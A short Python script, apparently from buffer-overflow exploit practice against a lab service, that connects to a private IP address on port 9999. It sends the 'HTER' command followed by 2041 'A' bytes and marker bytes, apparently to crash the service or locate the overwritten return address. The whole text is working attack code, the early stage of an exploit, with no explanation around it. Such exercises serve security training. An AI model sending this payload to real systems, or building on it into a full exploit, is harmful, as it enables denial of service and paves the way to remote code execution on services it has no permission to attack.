import socket, sys
from time import sleep
payload=b""
payload+=b"A"*2041
payload+=b"B"*8
payload+=b"G"*4
payload+=b"H"*4
payload+=b"I"*4
payload+=b"J"*4
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
